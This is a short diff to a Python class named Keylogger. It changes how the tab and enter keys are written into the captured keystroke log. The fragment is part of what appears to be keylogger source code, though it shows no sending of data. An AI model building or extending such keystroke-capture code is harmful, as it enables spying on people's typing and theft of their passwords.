@@ -14,14 +14,13 @@ class Keylogger:
 				log = log + " "
 				# print(log)
 			elif key == key.tab:
-				log = log + " Tab "
+				log = log + " \t "
 			elif key== key.enter:
-				log = log + " enter "
+				log = log + " \n "
 			elif key==key.backspace:
 				log = log + " backspace "
 			else:
 				log =  log + str(key)
-
 
 	def report(self):
 		global log
